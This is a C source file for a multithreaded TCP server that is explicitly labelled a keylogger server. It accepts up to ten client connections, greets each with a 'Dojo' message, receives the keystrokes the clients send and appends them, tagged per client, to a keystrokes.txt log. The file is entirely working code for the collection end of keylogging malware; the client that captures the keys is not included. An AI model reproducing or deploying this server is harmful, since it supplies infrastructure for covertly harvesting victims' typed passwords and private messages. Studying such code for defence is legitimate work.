/*
    ** MULTI-CLIENT KEYLOGGER SERVER (CLIENTS SENDS KEYSTROKES) **
*/

#include "utils.h"
#include <arpa/inet.h>
#include <bits/pthreadtypes.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <signal.h>

#define MAX_CLIENTS 10
int server_sock; 

// Mutual Exclusive Lock for shared file descriptor.
pthread_mutex_t mutexFD = PTHREAD_MUTEX_INITIALIZER;

// Shared: file descriptor for logging keystrokes, number of clients online and array to store connected client's socket.
int file_D, numOfClients, client_sockets[MAX_CLIENTS];

// Struct to store client.
typedef struct
{
    int client_socket;
} Client_Args;

// Function Prototype.
void *handle_client(void *args);
void handle_sigint(int sig);

int main(int argc, char *argv[])
{
    signal(SIGINT, handle_sigint);

    // check for proper arguments.
    if (argc != 3)
    {
        printf("usage: %s <option>\noptions:\t-p <port>"
               "\n[Exiting...]\n",
               argv[0]);
        return EXIT_FAILURE;
    }
    else if (strcmp(argv[1], "-p") != 0)
    {
        printf("usage: %s <option>\noptions:\t-p <port>"
               "\n[Exiting...]\n",
               argv[0]);
        return EXIT_FAILURE;
    }

    int port = get_port(argv[2]);
    if (port == -1)
    {
        fprintf(stderr, "[x] Invalid Port: %s\n", argv[2]);
        exit(EXIT_FAILURE);
    }

    // Create the server socket.
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0)
    {
        fprintf(stderr, "[x] Socket Creation! [FAILED]\n");
        exit(EXIT_FAILURE);
    }
    printf("[+] Server Socket Created!: FD %d [SUCCESS]\n", server_sock);

    // Define the server address structure.
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    socklen_t server_addr_len = sizeof(server_addr);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind the socket to the server address.
    if (bind(server_sock, (struct sockaddr *)&server_addr, server_addr_len) < 0)
    {
        fprintf(stderr, "[x] Binding! [FAILED]\n");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming client connection.
    if (listen(server_sock, MAX_CLIENTS) < 0)
    {
        fprintf(stderr, "[x] Listening! [FAILED]\n");
        exit(EXIT_FAILURE);
    }
    printf("[+] Listening On Port: %d [SUCCESS]\n", port);

    // Accept incoming client connection.
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    int client_sock, pthread;
    pthread_t client_thread;
    
    // Initialize number of clients online to 0.
    pthread_mutex_lock(&mutexFD);
    numOfClients = 0;

    // Open file for writing.
    file_D = open("keystrokes.txt", O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
    pthread_mutex_unlock(&mutexFD);

    while (numOfClients < MAX_CLIENTS)
    {

        client_sock = accept(server_sock, (struct sockaddr *)&client_addr,
                             &client_addr_len);
        if (client_sock < 0)
        {
            if (errno == EINTR)
            {
                continue; // Retry accept()...
            }
            else
            {
                fprintf(stderr, "[x] Accept! [FAILED]\n");
                exit(EXIT_FAILURE);
            }
        }
        printf("[+] New Client Online: FD %d [%s:%d]\n", client_sock, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        // Store connected client's socket in the client_sockets array.
        pthread_mutex_lock(&mutexFD);
        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (client_sockets[i] == 0)
            {
                client_sockets[i] = client_sock;
                // Increment number of clients online.
                numOfClients += 1;
                break;
            }
        }
        printf("[#] Clients Online =>[%d]\n", numOfClients);
        pthread_mutex_unlock(&mutexFD);

        // Allocate memory for client argument struct.
        Client_Args *client_args = malloc(sizeof(Client_Args));
        if (client_args == NULL)
        {
            fprintf(stderr, "[x] Memory Allocation! [FAILED]\n");
            close(server_sock);
            exit(EXIT_FAILURE);
        }

        client_args->client_socket = client_sock;

        // Create a new thread for the new client.
        pthread = pthread_create(&client_thread, NULL, handle_client,
                                 (void *)client_args);
        if (pthread != 0)
        {
            fprintf(stderr, "[x] Pthread Create! [FAILED]\n");
            free(client_args);
            exit(EXIT_FAILURE);
        }

        // Detach thread to prevent resource leaks.
        pthread_detach(client_thread);
    }

    close(file_D);
    close(server_sock);

    return EXIT_SUCCESS;
}

// Function to handle connected clients.
void *handle_client(void *args)
{
    // Handle connected clients.
    Client_Args *client = (Client_Args *)args;
    // Send message to client.
    const char *message = "Welcome To The Dojo! Warrior";

    ssize_t bytes_sent =
        send(client->client_socket, message, strlen(message), 0);
    if (bytes_sent < 0)
    {
        fprintf(stderr, "[x] Sending! [FAILED]\n");
        close(client->client_socket);
        free(client);
        return NULL;
    }
    char buffer[1024], keystrokes[1024];
    ssize_t bytes_received;

    // Receive client message and echo it back.
    while (1)
    {
        bytes_received = recv(client->client_socket, buffer,
                                  sizeof(buffer) - 1, 0); 
        if (bytes_received == 0)
        {
            fprintf(stderr, "[-] Client! [DISCONNECTED]\n");

            // Remove client_sock from the client_sockets[] array.
            pthread_mutex_lock(&mutexFD);
            for (int i = 0; i < MAX_CLIENTS; i++)
            {
                if (client_sockets[i] == client->client_socket) 
                {
                    client_sockets[i] = 0;
                    // Decrement number of clients online.
                    numOfClients -= 1;
                    break; 
                }
            }
            printf("[#] Clients Online =>[%d]\n", numOfClients);
            pthread_mutex_unlock(&mutexFD);

            // Clean up resources.
            close(client->client_socket);
            free(client);
            return NULL;
        }
        else if (bytes_received < 0)
        {
            fprintf(stderr, "[x] Receive! [FAILED]\n");
            
            // Remove client_sock from the client_sockets[] array.
            pthread_mutex_lock(&mutexFD);
            for (int i = 0; i < MAX_CLIENTS; i++)
            {
                if (client_sockets[i] == client->client_socket) 
                {
                    client_sockets[i] = 0;
                    // Decrement number of clients online.
                    numOfClients -= 1;
                    break; 
                }
            }
            printf("[#] Clients Online =>[%d]\n", numOfClients);
            pthread_mutex_unlock(&mutexFD);

            // Clean up resources.
            close(client->client_socket);
            free(client);
            return NULL;
        }

        buffer[bytes_received] = '\0';

        // Format the client keystrokes for logging.
        int written = snprintf(keystrokes, sizeof(keystrokes), "[Client %d] %s [LOGGED]\n", client->client_socket, buffer);

        pthread_mutex_lock(&mutexFD);
        write(file_D, keystrokes, written);
        pthread_mutex_unlock(&mutexFD);
        
        printf("[+] Received %zu bytes from client [%s]\n", bytes_received,
               buffer);

        // Echo back the message to the client.
        // ssize_t bytes_sent =
        //     send(client->client_socket, buffer, bytes_received, 0);
        // if (bytes_sent < 0)
        // {
        //     fprintf(stderr, "[x] Sending! [FAILED]\n");
        //     close(client->client_socket);
        //     free(client);
        //     return NULL;
        // }
        // printf("[+] Sent %zu bytes to client [SUCCESS]\n", bytes_sent);
    }

    close(client->client_socket);
    free(client);
    return NULL;
}

// Graceful shutdown handling.
void handle_sigint(int sig)
{
    close(file_D);
    close(server_sock);
    exit(EXIT_SUCCESS);
}
